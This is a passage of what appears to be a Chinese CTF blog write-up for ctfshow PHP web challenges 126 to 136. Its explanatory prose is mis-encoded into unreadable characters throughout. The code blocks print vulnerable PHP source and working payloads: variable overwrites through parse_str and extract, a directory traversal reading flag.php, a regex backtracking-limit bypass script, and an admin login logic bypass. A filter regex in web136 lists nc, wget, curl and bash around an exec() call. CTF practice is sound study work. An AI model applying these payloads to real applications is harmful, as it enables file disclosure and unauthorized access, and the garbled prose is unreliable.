stringã€‚</p><p>æ„æ€å°±æ˜¯é€šè¿‡$_SERVER[â€˜argvâ€™]å°†$aå˜æˆæ•°ç»„ï¼Œå†åˆ©ç”¨æ•°ç»„çš„æ€§è´¨å°†fl0g&#x3D;flag_give_meä¼ å…¥ï¼ŒåŒæ—¶è¿˜ç»•è¿‡ç¬¬ä¸€ä¸ªifä¸­çš„<code>!isset($_GET[&#39;fl0g])</code>,ç”¨+è¿›è¡Œåˆ†éš”ï¼Œä½¿å¾—æ•°ç»„ä¸­æœ‰å¤šä¸ªæ•°å€¼ã€‚<br>æ‰§è¡Œevalå‡½æ•°ä¹Ÿå°±æ˜¯æ‰§è¡Œ$cæ—¢æ˜¯parse_str($a[1]),ä½¿å¾—fl0g&#x3D;flag_give_me,ä»è€Œè¿›å…¥ç¬¬ä¸‰ä¸ªifè¯­å¥ã€‚<br><img src="/images/VFM8NQ1C93.png"></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">payload:<br>GET: ?a=<span class="hljs-number">1</span>+fl0g=flag_give_me<br>POST:CTF_SHOW=<span class="hljs-number">1</span>&amp;CTF[SHOW.COM=<span class="hljs-number">1</span>&amp;<span class="hljs-function"><span class="hljs-keyword">fun</span>=<span class="hljs-title">parse_str</span><span class="hljs-params">($a[<span class="hljs-number">1</span>])</span></span><br></code></pre></td></tr></table></figure><p>+ä¸ºç©ºæ ¼<br>æ•°ç»„ä»¥ç©ºæ ¼æ¥åˆ†å‰²<br>a[0]&#x3D;1<br>a[1]&#x3D;fl0g&#x3D;flag_give_me<br>ä¸”parse_str($a[1])ä¸º16ä¸ªå­—ç¬¦æ»¡è¶³æ¡ä»¶</p><h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$ctf_show</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>);<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><br><br><span class="hljs-comment">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$url</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ctf_show</span>===<span class="hljs-string">&#x27;ilove36d&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”±äºPHPçš„å˜é‡åä¸èƒ½å¸¦[ç‚¹]å’Œ[ç©ºæ ¼]ï¼Œæ‰€ä»¥å®ƒä»¬ä¼šè¢«è½¬åŒ–æˆä¸‹åˆ’çº¿<br>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GET:<br>?ctf <span class="hljs-attribute">show</span>=ilove36d<br></code></pre></td></tr></table></figure><p>å› ä¸ºç©ºæ ¼æ²¡æœ‰ç¦ç”¨è€Œ+å’Œ.è¢«ç¦ç”¨ï¼Œæ‰€ä»¥ç”¨â€™ â€˜æ¥ä»£æ›¿</p><h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$f1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f1&#x27;</span>];<br><span class="hljs-variable">$f2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f2&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$f1</span>))&#123;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$f1</span>,<span class="hljs-variable">$f2</span>)));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ç‰¹æ®Šå­—ç¬¦ä¸ºå‡½æ•°åªæœ‰ä¸€ä¸ª_()ï¼Œ_()&#x3D;&#x3D;gettext() æ˜¯gettext()çš„æ‹“å±•å‡½æ•°</p><p>get_defined_vars() å‡½æ•°è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ã€‚</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">payload:</span><br>?<span class="hljs-built_in">f1</span><span class="hljs-symbol">=_</span>&amp;<span class="hljs-built_in">f2</span><span class="hljs-symbol">=phpinfo</span><br></code></pre></td></tr></table></figure><p><img src="/images/I63.png"></p><p>å‘ç°gettextå¼€å¯</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">payload:</span><br>?<span class="hljs-built_in">f1</span><span class="hljs-symbol">=_</span>&amp;<span class="hljs-built_in">f2</span><span class="hljs-symbol">=get_defined_vars</span><br></code></pre></td></tr></table></figure><h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$f</span>, <span class="hljs-string">&#x27;ctfshow&#x27;</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$f</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>stripos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ã€‚<br>readfile() å‡½æ•°è¯»å–ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²ã€‚<br>ç›®å½•ç©¿è¶Š<br>æˆ‘ä»¬å¯ä»¥ä¸€çº§ä¸€çº§è¿”å›ä¸Šçº§ç›®å½•å†è¿›å…¥åˆ°æˆ‘ä»¬æƒ³è¿›å…¥çš„ç›®å½•ä¸­</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">payload:<br>?f=..<span class="hljs-regexp">/../</span>ctfshow<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<br></code></pre></td></tr></table></figure><h2 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="hljs-variable">$f</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$f</span>, <span class="hljs-string">&#x27;ctfshow&#x27;</span>) === <span class="hljs-literal">FALSE</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!!&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><br>&#125; <br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ª<code>if(preg_match(&#39;/.+?ctfshow/is&#39;, $f))</code><br>isä¸­ iä»£è¡¨åŒ¹é…å¤§å°å†™ sä»£è¡¨åŒ¹é…æ¢è¡Œ<br>+?ä»£è¡¨ctfshowå‰é¢è‡³å°‘æœ‰ä¸€ä¸ªå­—ç¬¦æ‰èƒ½åŒ¹é…<br>if(stripos($f, â€˜ctfshowâ€™) &#x3D;&#x3D;&#x3D; FALSE)åªè¦$fä¸­èƒ½åŒ¹é…åˆ°ctfshow,è¿”å›çš„intå€¼éƒ½ä¼šä¸ç­‰äºFALSE</p><p>æ‰€ä»¥<br>payloadï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">POST:</span><br>f=ctfshow<br></code></pre></td></tr></table></figure><h2 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="hljs-variable">$f</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;36Dctfshow&#x27;</span>) === <span class="hljs-literal">FALSE</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!!&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><br>&#125; <br></code></pre></td></tr></table></figure><p>å…ˆçœ‹stripos()å‡½æ•¸ï¼Œå®ƒçš„æ„æ€æ˜¯æŸ¥æ‰¾ â€œstringâ€ åœ¨å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼š<br>æ‰€ä»¥è¯´36Dctfshowå¿…é¡»åœ¨fä¸­å‡ºç°ï¼Œä½†åŒæ—¶preg_matchå‡½æ•°è¿‡æ»¤äº†ctfshowï¼Œæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘ç»•è¿‡preg_matchå‡½æ•°<br>ä¸€å…±æœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•ç»•è¿‡preg_matchå‡½æ•°</p><ol><li>æ•°ç»„ç»•è¿‡preg_matchåªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå½“ä¼ å…¥çš„subjectæ˜¯æ•°ç»„æ—¶ä¼šè¿”å›false</li><li>æ¢è¡Œç¬¦ç»•è¿‡ï¼Œpreg_matchä¸ä¼šåŒ¹é…æ¢è¡Œç¬¦ä¾‹å¦‚: &#x2F;?value&#x3D;%0ashell.php åˆ™ä¼šæˆåŠŸä¼ å…¥<br>&#x2F;?value&#x3D;shell.php</li><li>PCREå›æº¯é™åˆ¶æ¬¡æ•°ç»•è¿‡ï¼Œè¿™ä¸ªé€šä¿—çš„è®²ä¾¿æ˜¯é‡å¤çš„å¡«å…¥æ­£å¸¸å­—ç¬¦ä¸²ä¸€èˆ¬å¾€é‡Œé¢æ’å…¥ä¸ª100ä¸ªå­—æ¯ä¾¿å¯ï¼Œè®©preg_matchå‡½æ•°ä¸€ç›´å›æº¯ä¸€ç›´å›æº¯ï¼Œç›´åˆ°å¹ç¯æ‹”èœ¡è¿”å›false</li></ol><p>å‰ä¸¤ç§æ–¹å¼æäº¤å‘ç°å¹¶ä¸èƒ½ç»•è¿‡è¿”å›flag<br>é‚£ä¹ˆç”¨ç¬¬ä¸‰ç§æ–¹æ³•<br>é¦–å…ˆåœ¨phpç¼–è¯‘å™¨è¿è¡Œä¸‹åˆ—ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;fukk&#x27;</span>, <span class="hljs-string">&#x27;250000&#x27;</span>).<span class="hljs-string">&#x27;36Dctfshow&#x27;</span>;<br></code></pre></td></tr></table></figure><p>str_repeatæ˜¯ç”¨äºå¤åˆ¶<br>å¤åˆ¶ç²˜è´´åˆ°postï¼Œå¦‚æœå› ä¸ºå¤åˆ¶çš„å¤ªå¤šè€Œæ— æ³•å¤åˆ¶åˆ°æœ€åé¢çš„36Dctfshow,é‚£ä¹ˆæ‰‹åŠ¨æ·»åŠ å³å¯ï¼Œæäº¤å¾—åˆ°flag</p><p>ä¹Ÿå¯ä»¥pythonå†™ä¸€ä¸ªè„šæœ¬</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><br>url = <span class="hljs-string">&#x27;http://49eb1749-d5f4-4cfd-b5ef-4e14a38d2463.challenge.ctf.show/&#x27;</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;f&#x27;</span>: <span class="hljs-string">&#x27;fukk&#x27;</span> * 250000 + <span class="hljs-string">&#x27;36Dctfshow&#x27;</span><br>&#125;<br>r = requests.post(<span class="hljs-attribute">url</span>=url, <span class="hljs-attribute">data</span>=data).text<br><span class="hljs-built_in">print</span>(r)<br></code></pre></td></tr></table></figure><h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><p>æœ¬é¢˜æ˜¯ä¸€ä¸ªç½‘é¡µï¼Œè¿›å»éšä¾¿ç‚¹ä¸€ç‚¹ï¼Œæ²¡æœ‰å‘ç°å¯ç”¨çš„ä¿¡æ¯<br>å›æƒ³web4é‡Œæœ‰ä¸ªæç¤ºï¼šâ€æ€»æœ‰äººæŠŠåå°åœ°å€å†™å…¥robotsâ€<br>urlè¾“å…¥robots.txt<br>è·å¾—ä¸€ä¸ªæç¤º<br>è¿›å…¥admin<br>æˆ–è€…å¯ä»¥ç”¨å¾¡å‰‘æ¥æ‰«æ<br><strong>å¾¡å‰‘æ˜¯ç”¨æ¥æ–¹ä¾¿æŸ¥æ‰¾ç”¨æˆ·åå°ç™»å½•åœ°å€</strong><br>ä¹Ÿå¯ä»¥å¾—åˆ°admin<br>è¿›å…¥adminå¾—åˆ°ä¸‹é¢ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$code</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$code</span> === <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x36D</span>) &amp;&amp; <span class="hljs-variable">$password</span> === <span class="hljs-variable">$flag</span> || <span class="hljs-variable">$username</span> ===<span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>        <br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$code</span> == <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>        <br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>å†æ¥åˆ†æ<code>if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)</code></p><p>ç¬¬ä¸€ä¸ªcodeè®©ä»–ä¸ºfalseï¼Œpasswordä¹Ÿä¸ºfalseï¼Œåªè¦usernameä¸ºçœŸï¼Œå°±èƒ½é€šè¿‡if<br>æ‰€ä»¥payloadï¼š</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts">?<span class="hljs-attr">code</span><span class="hljs-operator">=</span><span class="hljs-number">888</span><span class="hljs-variable">&amp;password</span>=<span class="hljs-number">888</span><span class="hljs-variable">&amp;username</span>=admin<br><br></code></pre></td></tr></table></figure><h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$key1</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$key2</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key2&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonononono&quot;</span>);<br>&#125;<br>@<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$key1</span> == <span class="hljs-string">&#x27;36d&#x27;</span> &amp;&amp; <span class="hljs-variable">$key2</span> == <span class="hljs-string">&#x27;36d&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>çœ‹åˆ°parse_strå’Œextractï¼Œå˜é‡è¦†ç›–<br>ç¬¬ä¸€æ¡ifåˆ¤æ–­ï¼Œè¦æ±‚key1å’Œkey2ä¸èƒ½é€šè¿‡getå’Œpostä¼ é€’</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">parse_str</span><span class="hljs-params">()</span></span>:æŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­<br><span class="hljs-function"><span class="hljs-title">extract</span><span class="hljs-params">()</span></span>:å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨<br>$_SERVER<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]</span><br>query stringæ˜¯Uniform Resource Locator (URL)çš„ä¸€éƒ¨åˆ†, å…¶ä¸­åŒ…å«ç€éœ€è¦ä¼ ç»™web applicationçš„æ•°æ®<br></code></pre></td></tr></table></figure><p>parse_stræ˜¯å¯¹getè¯·æ±‚è¿›è¡Œçš„å†…å®¹è§£ææˆå˜é‡ï¼Œä¾‹å¦‚ä¼ é€’?a&#x3D;1,æ‰§è¡Œåå°±æ˜¯$a&#x3D;1.<br>é‚£ä¹ˆç›¸å¯¹çš„ï¼Œä¼ é€’_POST,å°±æ˜¯å¯¹$_POSTè¿›è¡Œèµ‹å€¼ï¼Œæ­£å¥½å°±å¯ä»¥ç»•è¿‡ifæ¡ä»¶å¯¹postçš„é™åˆ¶ã€‚extract()å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚</p><p>payload:<code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p><h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">function check($x)&#123;<br>    if(preg_match(&#x27;/\\$|<span class="hljs-string">\.</span>|<span class="hljs-string">\!</span>|<span class="hljs-string">\@</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\&#125;</span>|<span class="hljs-string">\&gt;</span>|<span class="hljs-string">\&lt;</span>|<span class="hljs-string">nc</span>|<span class="hljs-string">wget</span>|<span class="hljs-string">exec</span>|<span class="hljs-string">bash</span>|<span class="hljs-string">sh</span>|<span class="hljs-string">netcat</span>|<span class="hljs-string">grep</span>|<span class="hljs-string">base64</span>|<span class="hljs-string">rev</span>|<span class="hljs-string">curl</span>|<span class="hljs-string">wget</span>|<span class="hljs-string">gcc</span>|<span class="hljs-string">php</span>|<span class="hljs-string">python</span>|<span class="hljs-string">pingtouch</span>|<span class="hljs-string">mv</span>|<span class="hljs-string">mkdir</span>|<span class="hljs-string">cp/i&#x27;, $x))&#123;</span><br><span class="hljs-string">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="hljs-string">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="hljs-string">    check($c);</span><br><span class="hljs-string">    exec($c);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">else&#123;</span><br><span class="hljs-string">    highlight_file(__FILE__);</span><br><span class="hljs-string">&#125;</span><br><span 